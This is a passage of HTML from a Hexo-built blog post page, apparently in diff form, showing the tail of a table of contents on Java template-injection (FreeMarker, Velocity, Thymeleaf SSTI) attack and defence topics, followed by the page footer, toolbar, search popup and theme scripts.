href="#FreeMarker-SSTI-%E7%9A%84%E6%94%BB%E9%98%B2%E4%BA%8C%E8%B1%A1%E6%80%A7"><span class="nav-text">FreeMarker SSTI 的攻防二象性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0-new"><span class="nav-text">内置函数 new</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#API"><span class="nav-text">API</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FreeMarker-SSTI-%E4%BF%AE%E5%A4%8D"><span class="nav-text">FreeMarker SSTI 修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Velocity-SSTI"><span class="nav-text">0x03 Velocity SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="nav-text">基本语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Thymeleaf-SSTI"><span class="nav-text">0x04 Thymeleaf SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Thymeleaf-%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80"><span class="nav-text">Thymeleaf 语法基础</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring-MVC-%E5%AF%B9%E4%BA%8E-Thymeleaf-%E7%9A%84%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="nav-text">Spring MVC 对于 Thymeleaf 的解析流程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-Handler"><span class="nav-text">获取 Handler</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-Controller-%E5%B9%B6%E8%BF%94%E5%9B%9E-Model-And-View"><span class="nav-text">获取 Controller 并返回 Model And View</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#View-Resolver-%E4%B8%8E%E6%89%A7%E8%A1%8C%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93"><span class="nav-text">View Resolver 与执行模板渲染</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thymeleaf-SSTI-Bypass"><span class="nav-text">Thymeleaf SSTI Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%A0%E5%8F%82%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="nav-text">传参检测与绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#url-%E8%B7%AF%E5%BE%84%E7%9A%84-Thymeleaf-SSTI-%E6%94%BB%E9%98%B2"><span class="nav-text">url 路径的 Thymeleaf SSTI 攻防</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Thymeleaf-SSTI-%E6%97%A0%E5%9B%9E%E6%98%BE%E9%97%AE%E9%A2%98"><span class="nav-text">Thymeleaf SSTI 无回显问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-text">防御措施</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x05 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Ref"><span class="nav-text">0x06 Ref</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2021</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Drunkbaby</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
